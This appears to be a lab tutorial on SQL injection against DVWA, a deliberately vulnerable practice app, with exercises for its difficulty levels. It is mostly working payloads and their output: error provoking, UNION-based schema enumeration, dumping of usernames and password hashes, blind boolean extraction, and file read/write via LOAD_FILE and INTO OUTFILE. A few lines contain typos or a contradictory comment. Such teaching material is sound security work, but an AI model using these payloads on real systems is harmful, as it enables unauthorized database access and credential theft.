
# SQLinjection

## SQL Injection Cheat Sheets

 * https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)
 * https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
 * http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
 * http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html

## Provoke errors

Use the following chars or techniques to provoke errors or unexpected behavior in the sql statements

 * `'`		might throw an error
 * `"`		might throw an error
 * `%`		might be seen as a wild card (like statements), any number of any chars (0-unlimited)
 * `_`		might be seen as a wild card (like statements), any one character (not 0!)
 * `2-1`	might be seen as an arithmic statement (e.g. id=1 is the same as id=2-1)
 
This is by no means a complete list. It always depends on the system and type of database used, so make sure to look for additional ways to upset the target.

	# Example: DVWA low security sqli
	Input: '
	Output: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
	
In the example above, there is a sql statement like the following

	SELECT first_name, last_name FROM users WHERE user_id = '$id';"
	
By injecting an additional `'` instead of the expected user id number, we turn `WHERE user_id='number';` into `WHERE user_id='''`. Of course, three `'` don't make much sense, so MySQL throws the towel. 
We can use this, to inject our statements into the sql query and get additional information from the application.

## Exploiting a simple SQL injection

The sign `%` is a wildcard, similar to `*` in regular expressions. In this case, we cannot use `%` to return the information for all existing IDs in the database, since the statement is `WHERE user_id="$id"` and not `WHERE user_id LIKE '$id'`. For wildcards to work in MySQL, the `LIKE` statement is required instead or the equals (`=`) operator.

We can still get the application to spit out all the information however, by injecting our own statement. What we want to achieve is the following query.

	SELECT first_name, last_name FROM users WHERE user_id = '$id' or 1=1;"
	
This will select all entries where the user_id matches the provided ID in the request or where 1 matches 1. Since the second statement is always true, every existing entry will be returned.
To achieve this query, the following input is required in the DVWA form. (Note that there is a trailing whitespace after the `--`!)

	1' or 1=1;-- 
	
This has the following effect.

	SELECT first_name, last_name FROM users WHERE user_id = '$id' or 1=1;-- ';"

In MySQL, the characters `-- ` indicate a comment. By injecting these three characters after our statement, we dismiss the rest of the query, which in this case would be `';`. This is done to prevent the original closing `'` to cause an error.
Another way of ending a query is by using `#` instead of `-- `. If you're having trouble with one, try the other one instead.

There is another way of resolving this. Instead of using `1=1`, we can compare to letters with for example `'a'='a'` (or even `'0'='0'`. In this case, we can just leave out the closing `'` in our injection and use the existing one.

	1' or 'a'='a
	SELECT first_name, last_name FROM users WHERE user_id = '$id' or 'a'='a';"
	
The result should be the same in both cases. The application spills out the user details for all existing user IDs. However, more complex injections usually rely on comment characters to break out of the initial query.

## Getting more out of SQL

Replacing a specific query with a wildcard is nice, but it might not contain the information we're after. The UNION statement gives us a way of adding additional queries to our original one and adjust the output to our needs.
With the following query, we can find out what version of MySQL we are dealing with.

	' UNION SELECT null, version();#
	SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT null, version();#';"
	
In this case, we're leaving ID completely empty because we don't really care for it and instead add a different select statement using UNION. The important thing to remember with union is that the result must fit in the columns of the first statement.
The first select returns two columns, one for first_name and one for last_name. The second select statement only returns one column for version. In order for both statements to have the same amount of columns, we add a NULL in the second query.

The result should be an empty first_name column (null) and a last_name column containing the MySQL version.

Other interesting statements to include instead of version() are:

	user()		shows the currently connected mysql user (that the app uses)
	database()	shows the name of the used database (e.g. "dvwa")
	
UNION allows for more complex queries as well, like the following.

	# show all table names from all databases (this could be a bit much)
	' union select null, table_name from information_schema.tables where table_name like '%';#
	
	# show all table names from a specific database
	' union select null, table_name from information_schema.tables where table_schema='dvwa';#
	
	# show all column names for a specific database (could be a bit much)
	' union select null, column_name from information_schema.columns where table_schema='dvwa';#
	
	# show all column names for a specific database and table
	' union select null, column_name from information_schema.columns where table_schema='dvwa' and table_name='users';#
	
This should give you a enough of an overview of the database and its inner workins, to build your own queries and extract the information you need.
The following are just a few tricks that make working with mysql injections a bit easier.

	# combine two or more fields before returning them (0x0a is a newline, to keep things separated when printed)
	concat(column1,"text",column2)
	
	# The following example returns both first and last name but uses up both available fields of the original query.
	' union select first_name, last_name from dvwa.users where user=id=2;#
		First name: Gordon
		Surname: Brown
	
	# This query combines first and last name and leaves the other query free for additional fields (that might be combined as well)
	' union select concat(first_name," ",last_name),avatar from dvwa.users where user_id=2;#
		First name: Gordon Brown
		Surname: /hackable/users/gordonb.jpg
		
	# You can even adjust the output to your liking
	' union select first_name, concat(last_name,0x0a,"Avatar: ",avatar) from dvwa.users where user_id=2;#
		First name: Gordon
		Surname: Brown
		Avatar: /hackable/users/gordonb.jpg
	
	# And extract all passwords and usernames for all entries.
	' or union select first_name, concat(last_name,0x0a,"ID: ",user_id,0x0a,"PW: ",password) from dvwa.users;#
	
## SQL injection medium

On medium difficulty, the characters `'` and `"` are escaped so they cannot be injected anymore. This can be seen in the error message that is thrown, when `'` is included in a request.

	You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1
	
We can still test, if the query is vulnerable though. Instead of using the escaped signs, we can try an arithmetic function.

	id=2-1&Submit=Submit
	ID: 2-1
	First name: admin
	Surname: admin

Sure enough, submitting `2-1` instead of `1` still gives us the details of the admin account, that we know has the ID 1. This means that the quotes around `'$id'` from the low difficulty are gone, so we don't need `'` to break out anymore.

	2 union select first_name, concat(last_name,0x0a,user_id,0x0a,password) from dvwa.users;#
	First name: admin
	Surname: admin
	1
	5f4dcc3b5aa765d61d8327deb882cf99
	...

We might have lost a bit of formatting there, but we can still get the really juicy information out of the database.

## High difficulty

In this case, we've lost the detailed error message. Whenever the query is not valid, all we get in return is "Something went wrong.". This makes it much more difficult to find out, where our input needs to be adjusted.
Nevertheless, the query is still exploitable, the way to get there is just a bit more arduous.

	# valid query that should display all but only shows one output (points to a `limit=1` statement)
	1' or 'a'='a
	
	# valid query that removes everything that comes after and actually displays everything (removes `limit=1` statement)
	1' or 1=1;#
	
	# a fully working query is still accepted though :)
	1' union select first_name, concat(last_name,0x0a,"ID: ",user_id,0x0a,"PW: ",password) from dvwa.users;#
	First name: admin
	Surname: admin
	ID: 1
	PW: 5f4dcc3b5aa765d61d8327deb882cf99
	...

## Blind SQLi

**Task:** find out the password of the admin account in SQLi blind!

### faulty query (any difficulty)

	User ID is MISSING from the database.

### low

	1' union select null, version();#
	User ID exists in the database.

### medium


	1 union select null, version()
	User ID exists in the database.

### high

	1' union select null, version();#
	User ID exists in the database.

### Solution 

The difficulty settings are exactly the same as in the previous SQL injection with the one difference, that the result is always one of two. If a good query has been provided, the good message will be returned, otherwise the "MISSING" message will be printed, indicating that the query is faulty.

In order to exploit this, we need to change our approach as we cannot rely on the results of the query being printed. The following example shows how to do this on low difficulty, it is up to you to figure out how to do the same on medium and high.
Luckily, MySQL has our backs and provides us with the possibility of if-statements within queries. 

	if(condition,true_value,false_value)
	
This means that we can check for a condition and return either the first value if the condition is true or the second value if not. For example

	if(1<2,"yes","no")
	
This will always return "yes" except in strange universes where 1 is not smaller than 2. However, we can add other MySQL functions to this condition. 
For example we could check whether user_id equals 1 and return either true or false, which results in the effective query `WHERE user_id='' or 1;`.

	# Returns: "User ID exists the database." (true)
	' or if(user_id=1,true,false);-- 

	# Returns: "User ID is MISSING from the database." (false)
	' or if(user_id=22,true,false);-- 
	
	# Returns true but doesn't give us any info except that the query worked
	1' union select null, version();#
	
	# Returns false and tells us that the version does not start with 1
	' or if(version() LIKE "%",true,false);-- 

	# Returns true and tells us that the version does start with 5
	' or if(version() LIKE "5%",true,false);-- 
	
	# Returns true and tells us that the version does start with 5.
	' or if(version() LIKE "5.%",true,false);-- 
	
	# Returns true and tells us that the version does start with 5.7
	' or if(version() LIKE "5.7%",true,false);-- 
	
	# The same thing works with other areas as well
	' or if((select table_name from information_schema.tables where table_schema='dvwa' and table_name like 'user%') like 'u%',true,false);-- 

	# Same command as above with newlines for better readability
	' or if(
		(	select table_name 
			from information_schema.tables 
			where table_schema='dvwa' 
			and table_name like 'user%'
		) like 'u%',true,false);-- 
	
If the first select statement (which selects a `table_name` from the database `dvwa` that starts with `"u%"`) matches the string `"user%"`, then return true, otherwise return false.
This allows us to figure out names and values of databases, tables, columns and even fields one character at a time.
	
**Task 1:** Build three injection payloads for each step requried to extract the admin password 

 * 4 steps: finding the db name, table name and column names and extracing the password value
 * 3 payloads: first guess of a value, final guess of a value, verification that no more chars come afterwards

Hint: you can check if there is another character in a string by ending the like statement with `_%` instead of just `%`. `_` means there is exactly one more character while `%` means zero to unlimited chars.
	
**Task 2:** Adjust the payloads to fit the medium difficulty. Do they work in high as well?


## Random notes for SQLi

    # Additional functions
    @@hostname
    @@version_compile_os
    LOAD_FILE('/etc/system-release')

    # Example
    ' UNION select null,concat(FIELD1,0x3a,FIELD2) from DB.TABÖE INTO OUTFILE 'path/filename' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' --
